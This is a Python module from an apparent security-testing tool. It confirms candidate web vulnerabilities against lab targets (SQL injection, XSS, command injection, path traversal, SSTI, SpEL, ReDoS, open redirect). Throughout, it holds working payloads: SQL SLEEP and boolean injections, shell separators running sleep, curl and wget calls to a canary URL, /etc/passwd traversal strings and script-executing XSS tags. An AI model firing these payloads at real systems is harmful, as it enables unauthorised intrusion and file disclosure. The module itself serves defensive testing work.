"""Per-class confirmation strategies (Phase 2 T2.1).

Each strategy declares its `vuln_class` and the `mechanism` it uses, and confirms a
candidate deterministically or returns None (fail-closed — never a guess). New
classes are added as new strategies (and, later, plugin `register_oracle` hooks).
"""

from __future__ import annotations

import re
import secrets

from fuzzlab.oracle.baseline import build_baseline
from fuzzlab.oracle.browser import (
    SENTINEL,
    BrowserExecutor,
    ExecObservation,
    ExecRequest,
    StoreStep,
)
from fuzzlab.greybox.confirm import greybox_confirms, m10_evidence
from fuzzlab.greybox.coverage import CoverageSource, app_lines
from fuzzlab.greybox.dbfault import DbFaultSource
from fuzzlab.greybox.reward import GreyboxSignal
from fuzzlab.oracle.context import breakout_for, is_unescaped, type_reflection
from fuzzlab.oracle.oob import OobListener
from fuzzlab.oracle.probe import Candidate, Sender, Verdict

# --- error signatures (M2) ---------------------------------------------------
SQL_ERROR_SIGNATURES = [
    (re.compile(r"you have an error in your sql syntax", re.I), "MySQL"),
    (re.compile(r"warning:\s*mysqli?_", re.I), "MySQL"),
    (re.compile(r"sql syntax.*mariadb", re.I), "MariaDB"),
    (re.compile(r"unclosed quotation mark after the character string", re.I), "MSSQL"),
    (re.compile(r"quoted string not properly terminated", re.I), "Oracle"),
    (re.compile(r"pg_query\(\)|postgresql.*error|syntax error at or near", re.I), "PostgreSQL"),
    (re.compile(r"sqlite_error|sqlite3?::|unrecognized token", re.I), "SQLite"),
]

# --- timing templates (M1); {d} = requested delay in seconds ------------------
_TIMING_TEMPLATES = [
    "1 AND (SELECT 1 FROM (SELECT(SLEEP({d})))x)",
    "1' AND (SELECT 1 FROM (SELECT(SLEEP({d})))x)-- -",
    "1) AND (SELECT 1 FROM (SELECT(SLEEP({d})))x)-- -",
    "1' OR SLEEP({d})-- -",
]

# --- ReDoS timing payloads (M1, escalating-shape variant) ------------------
# Classic, independent (never nested/deepened) catastrophic-backtracking
# shapes, one per common "run of a repeated character class" a target's own
# content might contain. See RegexDosStrategy's own docstring for why this
# is a genuinely different M1 variant from _TIMING_TEMPLATES/
# _CMDI_TIMING_TEMPLATES's requested-delay shape.
_REDOS_TEMPLATES = [
    r"(a+)+$",
    r"(a|a)*$",
    r"(a|aa)+$",
    r"([a-zA-Z]+)*$",
    r"(\d+)+$",
]

# Command-injection timing templates (shell separators; {d} = delay seconds).
_CMDI_TIMING_TEMPLATES = [
    "; sleep {d}",
    "| sleep {d}",
    "|| sleep {d}",
    "& sleep {d}",
    "&& sleep {d}",
    "$(sleep {d})",
    "`sleep {d}`",
    "1; sleep {d}",
]

# Command-injection OOB templates (M8; {url} = the loopback canary URL). Shell
# separators pair with tools any target OS's shell/base image is overwhelmingly
# likely to have (curl/wget), so this needs no DNS component.
_CMDI_OOB_TEMPLATES = [
    "; curl {url}",
    "| curl {url}",
    "|| curl {url}",
    "& curl {url}",
    "&& curl {url}",
    "$(curl {url})",
    "`curl {url}`",
    "; wget -q -O- {url}",
]

# Open-redirect body sinks (meta refresh) and /etc/passwd content marker (M7).
_META_REFRESH = re.compile(r"http-equiv=[\"']?refresh[\"']?[^>]*url=([^\"'>\s]+)", re.I)
_PASSWD_MARKER = re.compile(r"root:.*?:0:0:", re.M)
_TRAVERSAL_PAYLOADS = [
    "../../../../../../../../etc/passwd",
    "....//....//....//....//etc/passwd",
    "..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
    "/etc/passwd",
    "../../../../etc/passwd%00",
]


def _ssti_payloads(expr: str) -> list[str]:
    """Payloads that evaluate `expr` across common template engines."""
    return ["${" + expr + "}", "{{" + expr + "}}", "<%= " + expr + " %>",
            "#{" + expr + "}", "${{" + expr + "}}"]


def _token() -> str:
    return secrets.token_hex(4)


class ConfirmationStrategy:
    vuln_class: str = ""
    mechanism: str = ""
    category: str = ""

    @property
    def arm(self) -> str:
        """Stable scheduler arm id (unique even when a mechanism spans classes)."""
        return f"{self.vuln_class}:{self.mechanism}"

    def applies(self, candidate: Candidate) -> bool:
        # Prefer category scoping (a candidate's category can have several strategies,
        # e.g. reflected/stored/DOM XSS); fall back to vuln_class for direct use.
        if candidate.category is not None:
            return candidate.category == self.category
        return candidate.vuln_class in (None, self.vuln_class)

    def confirm(self, candidate: Candidate, sender: Sender) -> Verdict | None:  # pragma: no cover
        raise NotImplementedError

    @staticmethod
    def _send(sender: Sender, candidate: Candidate, value: str,
              timing: bool = False):
        """Send a probe for the candidate, honoring its method/location.

        Backward-compatible: a plain GET/query candidate uses the old
        ``send(url, param, value, timing=)`` signature (so existing senders and test
        fakes are unaffected); only a POST/body (or other non-default) candidate
        passes ``method``/``location`` through.
        """
        if candidate.method == "GET" and candidate.location == "query":
            return sender.send(candidate.url, candidate.param, value, timing=timing)
        return sender.send(candidate.url, candidate.param, value, timing=timing,
                           method=candidate.method, location=candidate.location)

    # --- shared rising-delay timing confirmation (M1) ------------------------
    delays = (2, 4)
    baseline_samples = 3
    k = 3.0
    floor = 1.5           # seconds of added delay required above baseline
    tolerance = 0.6       # measured latency may fall this far short of the request

    def _confirm_timing(self, candidate: Candidate, sender: Sender,
                        templates: list[str]) -> Verdict | None:
        """Confirm a time-based injection: latency must rise with the requested delay.

        Shared by SQLi (SQL SLEEP) and command injection (shell sleep). Robust
        baseline (median/MAD), a floor above jitter, and a rising-delay check across
        two requested delays — never one slow response.
        """
        base = build_baseline([
            self._send(sender, candidate, "1", timing=True).elapsed
            for _ in range(self.baseline_samples)
        ])
        for template in templates:
            measured, ok = {}, True
            for d in self.delays:
                probe = self._send(sender, candidate, template.format(d=d), timing=True)
                measured[d] = probe.elapsed
                if not base.exceeds(probe.elapsed, k=self.k, floor=self.floor):
                    ok = False
                    break
                if probe.elapsed < d - self.tolerance:      # latency tracks the request
                    ok = False
                    break
            if ok and measured[self.delays[-1]] > measured[self.delays[0]]:
                return Verdict(True, self.vuln_class, self.mechanism,
                               {"baseline_median": round(base.median, 4),
                                "measured": {str(k): round(v, 4) for k, v in measured.items()},
                                "template": template})
        return None


class SqliErrorStrategy(ConfirmationStrategy):
    vuln_class = "sqli"
    mechanism = "error-signature"
    category = "sql-injection"
    _probes = ("'", '"', "')", "1'")

    def confirm(self, candidate, sender):
        for payload in self._probes:
            probe = self._send(sender, candidate, payload)
            for rx, dbms in SQL_ERROR_SIGNATURES:
                match = rx.search(probe.text or "")
                if match:
                    return Verdict(True, self.vuln_class, self.mechanism,
                                   {"dbms": dbms, "payload": payload,
                                    "match": match.group(0)[:120]})
        return None


class SqliBooleanStrategy(ConfirmationStrategy):
    vuln_class = "sqli"
    mechanism = "boolean-differential"
    category = "sql-injection"

    @staticmethod
    def _similar(a: str, b: str, rel: float = 0.05, absolute: int = 24) -> bool:
        return abs(len(a) - len(b)) <= max(absolute, rel * max(len(a), len(b), 1))

    def confirm(self, candidate, sender):
        benign = self._send(sender, candidate, "1")
        true_p = self._send(sender, candidate, "1 AND 1=1")
        false_p = self._send(sender, candidate, "1 AND 1=2")
        # A true condition looks like the benign page; a false condition does not.
        if self._similar(benign.text, true_p.text) and not self._similar(true_p.text, false_p.text):
            return Verdict(True, self.vuln_class, self.mechanism,
                           {"len_benign": len(benign.text), "len_true": len(true_p.text),
                            "len_false": len(false_p.text)})
        return None


class SqliTimingStrategy(ConfirmationStrategy):
    vuln_class = "sqli"
    mechanism = "differential-timing"
    category = "sql-injection"

    def confirm(self, candidate, sender):
        return self._confirm_timing(candidate, sender, _TIMING_TEMPLATES)


class ReflectedXssStrategy(ConfirmationStrategy):
    vuln_class = "xss-reflected"
    mechanism = "reflected-context"
    category = "xss"

    def confirm(self, candidate, sender):
        token = _token()
        marker = f"zqxm{token}"
        first = self._send(sender, candidate, marker)
        context = candidate.sink_context or type_reflection(first.text, marker)
        if context == "none":
            return None
        breakout = breakout_for(context, f"zqxb{token}")
        if breakout is None:
            return None
        fragment, signature = breakout
        second = self._send(sender, candidate, fragment)
        if is_unescaped(second.text, signature):
            return Verdict(True, self.vuln_class, self.mechanism,
                           {"context": context, "signature": signature})
        return None


class OpenRedirectStrategy(ConfirmationStrategy):
    """M9: the parameter controls the redirect target (Location or meta refresh).

    ``vuln_class`` is underscored (``open_redirect``), not hyphenated, to match
    this project's own established ground-truth/manifest convention for this
    class (``lab/safety_matrix.yaml``'s `open_redirect` concern, `labels.
    schema.json`'s `vuln_class` enum, and every `open_redirect` manifest's own
    `class:` field) -- ``category`` stays hyphenated (`open-redirect`), the
    separate, deliberately-hyphenated category namespace every other strategy
    also uses (`sql-injection`, `server-side-template-injection`, ...)."""
    vuln_class = "open_redirect"
    mechanism = "redirect-target-control"
    category = "open-redirect"

    @staticmethod
    def _header(probe, name):
        return next((v for k, v in probe.headers.items() if k.lower() == name), "")

    def confirm(self, candidate, sender):
        canary = f"https://oracle{_token()}.example/cb"
        probe = self._send(sender, candidate, canary)
        location = self._header(probe, "location")
        if location.startswith(canary):
            return Verdict(True, self.vuln_class, self.mechanism,
                           {"sink": "location-header", "location": location[:200]})
        m = _META_REFRESH.search(probe.text or "")
        if m and m.group(1).startswith(canary):
            return Verdict(True, self.vuln_class, self.mechanism,
                           {"sink": "meta-refresh", "url": m.group(1)[:200]})
        return None


class SstiStrategy(ConfirmationStrategy):
    """M4: a template expression is evaluated server-side (product appears, not the literal)."""
    vuln_class = "ssti"
    mechanism = "evaluation-marker"
    category = "server-side-template-injection"

    def confirm(self, candidate, sender):
        a, b = secrets.randbelow(900) + 100, secrets.randbelow(900) + 100
        expr, product = f"{a}*{b}", str(a * b)
        for payload in _ssti_payloads(expr):
            text = self._send(sender, candidate, payload).text or ""
            if product in text and expr not in text:      # evaluated, not just reflected
                return Verdict(True, self.vuln_class, self.mechanism,
                               {"payload": payload, "product": product})
        return None


class SpelInjectionStrategy(ConfirmationStrategy):
    """A Spring Expression Language (SpEL) expression is evaluated with an
    unrestricted evaluation context (CWE-917, category 5's `spel_injection`).

    **Deliberately not `SstiStrategy`'s own bare-arithmetic-product canary.**
    A real vulnerable sink of this shape parses the *entire* raw parameter
    as a bare SpEL expression with no delimiter -- but a restricted
    `SimpleEvaluationContext` (the real, documented fix for this class, per
    `CC-LAB-0214`) still permits ordinary literal arithmetic; it only
    restricts type references (`T(...)`), bean references, constructors,
    and arbitrary method/property access. A bare-arithmetic canary
    (`<a>*<b>`) would therefore evaluate identically under BOTH twins --
    a guaranteed false positive on the secure twin, not a rare one, caught
    by this component's own pre-change review gate before implementation.
    Uses a `T(java.lang.Math).abs(-<n>)` type-reference canary instead --
    the exact differential this project already proved live
    (`tests/test_labgen_spel_injection_live_boot.py`): evaluates for real
    under an unrestricted context, rejected outright under a restricted
    one."""
    vuln_class = "spel_injection"
    mechanism = "type-reference-evaluation"
    category = "spel-injection"

    def confirm(self, candidate, sender):
        n = secrets.randbelow(900) + 100
        payload = f"T(java.lang.Math).abs(-{n})"
        text = self._send(sender, candidate, payload).text or ""
        if str(n) in text and payload not in text:         # evaluated, not just reflected
            return Verdict(True, self.vuln_class, self.mechanism,
                           {"payload": payload, "result": str(n)})
        return None


class PriceIntegrityBypassStrategy(ConfirmationStrategy):
    """A client-submitted amount is trusted and echoed back verbatim instead
    of being recomputed server-side from a rate table (category 5's
    `price_integrity_bypass`, Booking.com pilot). No CWE is cited for this
    class -- it is a business-logic/trust-boundary defect, not a parser or
    injection flaw; grounded in the real QloApps `Cart::getOrderTotal()`
    trust pattern this shape was modeled on.

    **The vulnerable twin (`LABGEN-BC-0005`) has an empty transform pipeline**
    (`transform: []`) -- there is no named "trusted amount" class to detect;
    the differential is the *absence* of the secure twin's own server-side
    recomputation op, proven live in
    `tests/test_labgen_price_integrity.py::test_live_boot_price_integrity_manifest_ignores_the_client_amount_on_the_secure_twin`.

    **Canary has three decimal places**, structurally distinct from the real
    rate table's own two-decimal-place values (`89.00`/`149.00`/`249.00` --
    also excluded explicitly, defense in depth) -- a random two-decimal
    canary could otherwise coincidentally collide with a real rate, caught
    by this component's own pre-change adequacy review before implementation.

    **Match is anchored**: `"charged_amount":"<canary>"` (after stripping
    whitespace from the response body, mirroring the live-boot test's own
    normalization) -- not a bare substring search, which could false-match
    an unrelated field that happens to contain the same digits."""
    vuln_class = "price_integrity_bypass"
    mechanism = "trusted-client-amount-echo"
    category = "price-integrity-bypass"

    #: The real rate-table literals this shape's secure twin can return --
    #: excluded explicitly even though the canary's own decimal-place shape
    #: already makes a collision structurally impossible (defense in depth).
    _RATE_TABLE_AMOUNTS = frozenset({"89.00", "149.00", "249.00"})

    def confirm(self, candidate, sender):
        while True:
            whole = secrets.randbelow(9000) + 100
            frac = secrets.randbelow(900) + 100
            canary = f"{whole}.{frac}"
            if canary not in self._RATE_TABLE_AMOUNTS:
                break
        text = (self._send(sender, candidate, canary).text or "").replace(" ", "")
        if f'"charged_amount":"{canary}"' in text:
            return Verdict(True, self.vuln_class, self.mechanism,
                           {"payload": canary, "echoed": canary})
        return None


class PathTraversalStrategy(ConfirmationStrategy):
    """M7: a file-content marker (/etc/passwd) appears in the response."""
    vuln_class = "file-inclusion"
    mechanism = "file-content-marker"
    category = "file-inclusion"

    def confirm(self, candidate, sender):
        for payload in _TRAVERSAL_PAYLOADS:
            if _PASSWD_MARKER.search(self._send(sender, candidate, payload).text or ""):
                return Verdict(True, self.vuln_class, self.mechanism, {"payload": payload})
        return None


class CommandInjectionStrategy(ConfirmationStrategy):
    """M1 (timing): a shell `sleep` executes, latency rising with the requested delay."""
    vuln_class = "command-injection"
    mechanism = "differential-timing"
    category = "command-injection"

    def confirm(self, candidate, sender):
        return self._confirm_timing(candidate, sender, _CMDI_TIMING_TEMPLATES)


class RegexDosStrategy(ConfirmationStrategy):
    """M1 (differential timing), ReDoS variant: attacker-controlled regex-
    pattern construction causes catastrophic backtracking (CWE-1333),
    confirmed the same way SQLi/command-injection's timing use is --
    latency must rise far above a robust baseline -- but escalating a
    genuinely different axis, documented here rather than treated as a
    silent special case.

    **Why this is not `_confirm_timing` with a new template list.**
    `_TIMING_TEMPLATES`/`_CMDI_TIMING_TEMPLATES` each embed an explicit,
    attacker-*requested* delay (`SLEEP({d})`/`sleep {d}`) that a vulnerable
    target is expected to honor almost exactly, so `_confirm_timing` can
    assert both "well above baseline" AND "tracks the requested duration"
    (`probe.elapsed >= d - tolerance`) across two escalating delays. A ReDoS
    payload has no requested duration at all: how long a pathological
    pattern takes to fail (or succeed) matching is an emergent property of
    the regex engine's own backtracking over the TARGET's own content --
    content this strategy never sees and cannot control the shape of (only
    the pattern, sent as the probe value, is attacker-controlled here).
    There is therefore nothing to compare the measured latency *against*
    the way `_confirm_timing` compares it against `d`.

    **The escalation axis used instead.** Several independent, single-level
    (never nested/deepened) classic catastrophic-backtracking shapes
    (`_REDOS_TEMPLATES`), each targeting a different common "run of a
    repeated character class" (letters, digits, an alternation) a target's
    real content might contain. Nesting depth was tried and explicitly
    rejected during this mechanism's own calibration: deepening a single
    evil shape by even one level (`(a+)+$` -> `((a+)+)+$`) compounds the
    already-exponential blowup so violently that it hung well past any
    CI-safe bound on ordinary lab content -- see
    ``docs/architecture/oracle-confirmation.md``'s M1 ReDoS section for the
    calibration numbers. Confirmation requires **at least two** independent
    templates to each measure latency far above baseline
    (``floor``/``k``, overridden below to fit this mechanism's
    deliberately bounded, tens-to-low-hundreds-of-milliseconds probe
    magnitude, never the multi-second scale ``_confirm_timing``'s own
    ``floor=1.5`` assumes) -- the ReDoS analogue of "two escalating
    delays," substituting "two independent evil shapes" for "two requested
    durations" since no requested duration exists here.

    **Stated limitation, not silently equated with the SQLi/cmdi uses.**
    This can only detect ReDoS when the target's own content already
    contains a run of the character class a template targets -- a
    black-box confirmer has no way to know that shape in advance. Multiple
    templates targeting different common runs raise the odds without
    needing that knowledge, but coverage is inherently probabilistic here,
    unlike every other M1 use in this module (which can always supply their
    own exact requested delay). This mechanism was proven end to end
    against this project's own `node_express` ReDoS lab cells
    (`tests/test_labgen_redos.py`, real Node subprocess execution, not
    simulated timing), not yet against an arbitrary external target.
    """

    vuln_class = "redos"
    mechanism = "differential-timing"
    category = "regular-expression"

    # Overridden from the base class's SQLi/cmdi-tuned defaults: this
    # mechanism's probes are deliberately bounded to tens/low-hundreds of
    # milliseconds (never multi-second), so floor/k must be small enough to
    # actually fire at that scale while still clearing ordinary request
    # jitter (observed at low-single-digit milliseconds in this project's
    # own calibration, see the class docstring above).
    baseline_samples = 3
    k = 4.0
    floor = 0.02            # seconds (20ms) above baseline required
    min_confirming_templates = 2
    benign_probe = "ordinary-search-term"

    def confirm(self, candidate, sender):
        base = build_baseline([
            self._send(sender, candidate, self.benign_probe, timing=True).elapsed
            for _ in range(self.baseline_samples)
        ])
        confirming = []
        for template in _REDOS_TEMPLATES:
            probe = self._send(sender, candidate, template, timing=True)
            if base.exceeds(probe.elapsed, k=self.k, floor=self.floor):
                confirming.append({"template": template, "elapsed": round(probe.elapsed, 4)})
                if len(confirming) >= self.min_confirming_templates:
                    return Verdict(True, self.vuln_class, self.mechanism,
                                   {"baseline_median": round(base.median, 4),
                                    "confirming_templates": confirming})
        return None


class CommandInjectionOobStrategy(ConfirmationStrategy):
    """M8: blind command injection confirmed by an out-of-band callback.

    For the blind case where no timing skew or response difference is
    observable (output suppressed, egress delayed): embed a unique loopback
    canary URL in a shell-fetch payload and confirm only if that exact token
    is later requested. Needs an injected, already-started `OobListener`
    (lab loopback only, default-off, same seam shape as the M6
    `BrowserExecutor`); without one this strategy no-ops (fail-closed), never
    reaching for a real network listener on its own.
    """
    vuln_class = "command-injection"
    mechanism = "oob-callback"
    category = "command-injection"

    def __init__(self, listener: OobListener | None = None, timeout: float = 1.5):
        self._listener = listener
        self._timeout = timeout

    def confirm(self, candidate, sender):
        if self._listener is None:
            return None
        for template in _CMDI_OOB_TEMPLATES:
            token = self._listener.register()
            canary = self._listener.callback_url(token)
            self._send(sender, candidate, template.format(url=canary))
            hit = self._listener.wait_for(token, timeout=self._timeout)
            if hit is not None:
                return Verdict(True, self.vuln_class, self.mechanism,
                               {"canary": canary, "template": template,
                                "hit_path": hit.path, "remote_addr": hit.remote_addr})
        return None


# Grey-box (M10) default confirmation-side probes: something that would reach the
# vulnerable sink (a SQLi syntax-breaker; an XSS canary) so the coverage/DB-fault
# side channel has something to observe. Distinct from the black-box strategies'
# own probes above -- this one probe is purely to *generate* the signal, not to
# read the HTTP response for a verdict (the verdict comes from coverage/db_fault).
_GREYBOX_APP_ROOT = "/var/www/html"
_GREYBOX_PROBE_PAYLOADS = {
    "sqli": "1' OR '1'='1' -- -",
    "xss": "<fzlgbx>",
}


def _greybox_sink_file(url: str, app_root: str = _GREYBOX_APP_ROOT) -> str:
    """Map a candidate's URL to the app file expected to serve it (…/login.php)."""
    from urllib.parse import urlparse
    path = urlparse(url).path or "/"
    base = path.rsplit("/", 1)[-1] or "index.php"
    return app_root.rstrip("/") + "/" + base


class GreyboxConfirmationStrategy(ConfirmationStrategy):
    """M10: grey-box confirmation via a covered sink line (+ a DB fault for SQLi).

    A cross-cutting, category-agnostic secondary mechanism layered alongside the
    category-specific black-box strategies (the same pattern M8's OOB callback
    uses alongside M1 timing for command injection): where the black-box
    mechanisms for `sql-injection`/`xss` abstain, `greybox_confirms()` (the pure
    decision in `fuzzlab/greybox/confirm.py`) confirms from the injected
    `CoverageSource`/`DbFaultSource` instead.

    Needs both the request-to-signal correlation and at least one source to do
    anything: the ``sender`` passed to `confirm()` must expose the
    ``send_correlated(url, param, value, *, method, location) -> (Probe, request_id)``
    contract already established for the live grey-box run
    (`fuzzlab/greybox/run.py`'s `RequestsCorrelatingSender`), so the probe this
    strategy sends can be matched back to the coverage/DB-fault side channel by a
    fresh ``X-Fzl-Cov`` id. Without a `send_correlated`-capable sender, or without
    either source injected, this strategy no-ops (returns ``None``, fail-closed) --
    same seam shape as the M6 `BrowserExecutor` / M8 `OobListener`. The *live*
    pcov/DB-fault side channel behind these sources is on-host infra (T3.1/T3.4,
    docs/ON_HOST_TASKS.md); this wiring layer is fully exercised offline via
    `InMemoryCoverageSource`/`InMemoryDbFaultSource`.
    """
    mechanism = "grey-box-coverage"
    category = ""                      # applies() is overridden (spans two categories)
    _CATEGORIES = ("sql-injection", "xss")

    def __init__(self, coverage: CoverageSource | None = None,
                 dbfault: DbFaultSource | None = None,
                 app_root: str = _GREYBOX_APP_ROOT):
        self._coverage = coverage
        self._dbfault = dbfault
        self._app_root = app_root

    def applies(self, candidate: Candidate) -> bool:
        return candidate.category in self._CATEGORIES

    def confirm(self, candidate, sender):
        if self._coverage is None and self._dbfault is None:
            return None                                    # no source injected -> no-op
        send_correlated = getattr(sender, "send_correlated", None)
        if send_correlated is None:
            return None                                    # sender can't mint a correlation id
        vuln_class = candidate.vuln_class or category_to_oracle_class(candidate.category)
        if not vuln_class:
            return None
        family = "sqli" if vuln_class.startswith("sqli") else "xss"
        payload = _GREYBOX_PROBE_PAYLOADS[family]
        _probe, request_id = send_correlated(candidate.url, candidate.param, payload,
                                             method=candidate.method,
                                             location=candidate.location)
        coverage = app_lines(self._coverage.lines_for(request_id)) \
            if self._coverage is not None else {}
        sink_covered = _greybox_sink_file(candidate.url, self._app_root) in coverage
        db_fault = self._dbfault.fault_for(request_id).faulted \
            if self._dbfault is not None else False
        signal = GreyboxSignal(sink_covered=sink_covered, db_fault=db_fault)
        if greybox_confirms(vuln_class, signal):
            return Verdict(True, vuln_class, self.mechanism, m10_evidence(vuln_class, signal))
        return None


# --- browser-execution XSS (M6): stored + DOM. Need an injected BrowserExecutor. ---
def _xss_exec_payloads(token: str) -> list[str]:
    """Payloads that, if they execute, call the sentinel with the token."""
    call = f"{SENTINEL}('{token}')"
    return [
        f"<img src=x onerror=\"{call}\">",
        f"\"><img src=x onerror=\"{call}\">",
        f"<svg onload=\"{call}\">",
        f"<script>{call}</script>",
    ]


class _BrowserXssStrategy(ConfirmationStrategy):
    """Shared M6 logic: place a tokened payload, execute in a browser, confirm on fire."""
    category = "xss"

    def __init__(self, executor: BrowserExecutor | None = None):
        self._executor = executor

    def _observe(self, candidate: Candidate, payload: str, token: str) -> ExecObservation:
        raise NotImplementedError

    def confirm(self, candidate, sender):
        if self._executor is None:
            return None                       # no browser available -> cannot confirm
        for payload in _xss_exec_payloads((token := _token())):
            obs = self._observe(candidate, payload, token)
            if obs.executed:
                return Verdict(True, self.vuln_class, self.mechanism,
                               {"payload": payload, "detail": obs.detail})
        return None


class DomXssStrategy(_BrowserXssStrategy):
    """M6: payload in the URL (query/fragment) executes client-side (no server round-trip)."""
    vuln_class = "xss-dom"
    mechanism = "browser-execution"

    def _observe(self, candidate, payload, token):
        location = candidate.location if candidate.location in ("query", "fragment") else "query"
        return self._executor.run(
            ExecRequest(url=candidate.url, param=candidate.param, value=payload,
                        location=location), token)


class StoredXssStrategy(_BrowserXssStrategy):
    """M6: payload stored via one request, executes when the render page is loaded."""
    vuln_class = "xss-stored"
    mechanism = "browser-execution"

    def _observe(self, candidate, payload, token):
        if not candidate.store_url:
            return ExecObservation(False)     # need the store endpoint (source_url)
        store = StoreStep(url=candidate.store_url, param=candidate.store_param or candidate.param,
                          value=payload, method=candidate.store_method,
                          location=candidate.store_location)
        return self._executor.run(ExecRequest(url=candidate.url, store=store), token)


def default_strategies(browser: BrowserExecutor | None = None,
                       oob: OobListener | None = None,
                       coverage: CoverageSource | None = None,
                       dbfault: DbFaultSource | None = None) -> list[ConfirmationStrategy]:
    """Cheapest/strongest first, per category. `applies()` scopes each to its category.

    The M6 browser strategies are included with the injected ``browser`` (or without,
    in which case they no-op — stored/DOM XSS stays unconfirmed until a browser is
    set). Likewise the M8 OOB strategy is included with the injected, already-started
    ``oob`` listener (or without, in which case it no-ops — blind command injection
    still confirms via M1 timing, just not via OOB callback). The M10 grey-box
    strategy is included last (a secondary, cross-cutting layer over sql-injection/
    xss): with neither ``coverage`` nor ``dbfault`` injected it no-ops, same as the
    others.
    """
    return [SqliErrorStrategy(), SqliBooleanStrategy(), SqliTimingStrategy(),
            ReflectedXssStrategy(), DomXssStrategy(browser), StoredXssStrategy(browser),
            OpenRedirectStrategy(), SstiStrategy(), SpelInjectionStrategy(),
            PriceIntegrityBypassStrategy(),
            PathTraversalStrategy(), CommandInjectionStrategy(),
            CommandInjectionOobStrategy(oob), RegexDosStrategy(),
            GreyboxConfirmationStrategy(coverage, dbfault)]


# Reference-style category -> the oracle vuln_class we have a strategy for.
# Categories absent here have no confirmer yet (candidate emitted, not confirmed).
# Categories the oracle can confirm -> a representative class (the value is a hint;
# the pipeline scopes strategies by `category`, and 'xss' fans out to reflected +
# stored + DOM). A category absent here has no confirmer yet.
_CATEGORY_TO_CLASS = {
    "sql-injection": "sqli",
    "xss": "xss-reflected",
    "open-redirect": "open-redirect",
    "server-side-template-injection": "ssti",
    "spel-injection": "spel_injection",
    "price-integrity-bypass": "price_integrity_bypass",
    "file-inclusion": "file-inclusion",
    "command-injection": "command-injection",
    "regular-expression": "redos",
}


def category_to_oracle_class(category: str) -> str | None:
    return _CATEGORY_TO_CLASS.get(category)
